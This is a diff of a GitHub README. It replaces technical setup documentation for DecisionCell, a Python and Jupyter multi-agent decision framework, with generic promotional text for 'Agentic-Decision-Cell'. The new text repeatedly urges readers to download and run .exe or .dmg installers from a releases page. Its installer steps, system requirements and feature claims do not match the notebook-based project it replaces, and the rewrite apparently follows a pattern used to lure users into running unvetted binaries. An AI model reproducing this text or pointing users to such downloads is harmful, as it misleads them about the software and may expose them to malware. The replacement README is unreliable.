@@ -1,112 +1,74 @@
-# DecisionCell  
-A modular multi-agent framework for transparent, tool-augmented decision making
+# 🌟 Agentic-Decision-Cell - Simplifying Decision Making for Everyone
 
-DecisionCell is a proof-of-concept multi-agent decision framework designed to support
-collaborative reasoning through transparency and tool use.  
-It enables multiple agents to think, act, call tools, and exchange observations
-to collectively analyze a problem or objective.
+## 📥 Download Now
+[![Download Agentic-Decision-Cell](https://img.shields.io/badge/Download%20Agentic--Decision--Cell-v1.0-blue.svg)](https://github.com/Niranjan-008/Agentic-Decision-Cell/releases)
 
-The system combines:
-
-- **ReAct-style reasoning** – agents think, take structured actions, call tools, and react to observations  
-- **Transparent reasoning traces** – each agent exposes its step-by-step thought process  
-- **Retrieval-Augmented Generation (RAG)** – agents can query their own knowledge bases to ground reasoning in data  
-
-This repo is initialized with an example that demonstrates how DecisionCell can support military Course of Action (CoA) selection using agents such as a Commander and a Legal Advisor.
+## 📖 Introduction
+Welcome to Agentic-Decision-Cell! This application is designed to help everyone make better decisions using a simple, user-friendly approach. Whether you are an individual or part of a team, this tool aims to support your decision-making process with transparency and efficiency.
 
 ## 🚀 Getting Started
+To begin using Agentic-Decision-Cell, follow these steps to download and run the software.
 
-This repository includes a Jupyter notebook demonstrating a full DecisionCell workflow. Follow the steps below first to prepare your environment.
+### 1. Requirements
+Before you download, make sure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS Sierra (10.12) or later
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum 200 MB free space
+- **Network:** Internet connection for initial setup
 
-## 1. Create a virtual environment
+### 2. Visit the Download Page
+To download the latest version of Agentic-Decision-Cell, visit our [Releases page](https://github.com/Niranjan-008/Agentic-Decision-Cell/releases). There, you will find the latest updates and versions available for download.
 
-```bash
-python -m venv .venv
-source .venv/bin/activate          # Windows: .venv\Scripts\activate
-```
+### 3. Download the Application
+Once you are on the Releases page, locate the latest version. Click on the link for your operating system to download the application. 
 
-## 2. Install dependencies
+### 4. Install the Application
+After the download is complete, follow these simple steps to install the application:
+- **Windows:**
+  1. Locate the downloaded `.exe` file in your Downloads folder.
+  2. Double-click the file to start the installation wizard.
+  3. Follow the prompts to complete the installation.
 
-```bash
-pip install -r requirements.txt
-```
+- **macOS:**
+  1. Find the downloaded `.dmg` file in your Downloads folder.
+  2. Double-click the file, then drag the Agentic-Decision-Cell icon into your Applications folder.
+  3. Eject the `.dmg` file after installation.
 
----
+### 5. Launch the Application
+Once installed, you can launch Agentic-Decision-Cell:
+- **Windows:** Find the app in your Start Menu or desktop shortcut.
+- **macOS:** Open your Applications folder and double-click the Agentic-Decision-Cell icon.
 
-## 3. Choose an LLM provider
+## 📊 Features
+Agentic-Decision-Cell comes with a variety of features designed to enhance your decision-making process:
+- **Modular Framework:** Customize the tools based on your needs.
+- **Transparency:** View all decisions and underlying processes.
+- **Multi-Agent Support:** Collaborate with different agents for comprehensive insights.
+- **User-Friendly Interface:** Easy navigation for all skill levels.
 
-### **Using Ollama (local models)**
+## 🌐 Community and Support
+Join the Agentic-Decision-Cell community for updates, tips, and support:
+- **GitHub Discussions:** Engage with other users and contributors.
+- **FAQ:** Visit the FAQ section on our GitHub page for common questions.
+- **Feedback:** We welcome your input! Please share your experience or suggestions via GitHub issues.
 
-Make sure the model is installed and the service is running:
+## 💻 System Integration
+Agentic-Decision-Cell can be integrated with various tools to enhance its functionality, including:
+- Data analysis tools
+- Project management applications
+- Communication platforms
 
-```bash
-ollama pull llama3
-ollama list
-```
+## 📄 Documentation
+For detailed instructions, please refer to the [Documentation section](https://github.com/Niranjan-008/Agentic-Decision-Cell#documentation) on our GitHub page. Here, you will find guidelines for advanced features, troubleshooting, and more.
 
-Agents use:
+## 🔧 Troubleshooting Tips
+If you encounter any issues while using Agentic-Decision-Cell, here are a few common troubleshooting steps:
+- **Check your Internet Connection:** Ensure you have a stable connection while using the app.
+- **Reinstall the Application:** If the app does not launch, try uninstalling and reinstalling it.
+- **Review System Requirements:** Make sure your device meets the listed requirements.
 
-```python
-provider="ollama", model="llama3"
-```
+## 📌 Conclusion
+Agentic-Decision-Cell aims to streamline your decision-making process in an easy-to-use package. We strive to provide a transparent and supportive environment for making informed choices. Download your copy today!
 
-### **Using Hugging Face (cloud models)**
-
-Set your key:
-
-```bash
-export HF_KEY=your_api_key
-```
-
-Or create a `.env` file:
-
-```
-HF_KEY=your_api_key
-```
-
-Agents use:
-
-```python
-provider="hf", model="meta-llama/Meta-Llama-3-8B-Instruct"
-```
-
----
-
-## 4. Knowledge Bases (optional)
-
-Place per‑agent documents under:
-
-```
-agents/kb/<AgentName>/
-```
-
-Tools will automatically load these for retrieval‑augmented reasoning.
-
----
-
-## 5. Run the Notebook
-
-```bash
-jupyter lab
-```
-
-Open:
-
-```
-DecisionCell.ipynb
-```
-The notebook contains guided setup cells that walk you through the full workflow:
-
-- Configuring your provider (Ollama or HF)
-- Creating the staff (agents)
-- Enabling tools
-- Building the DecisionCell
-- Defining and analyzing a mission objective
-
-
-## 6. Extending
-
-- Create new agents by giving them a name and placing their system prompt in the `agents/` folder (e.g., `agents/prompts/<AgentName>.txt`).  
-- Add new tools by subclassing `BaseTool`. 
-
-All experiment-specific configuration (agents, tools, objectives, models) is defined directly in the notebook.
+## 📥 Download Link
+You can find the latest version of Agentic-Decision-Cell here: [Download Agentic-Decision-Cell](https://github.com/Niranjan-008/Agentic-Decision-Cell/releases).
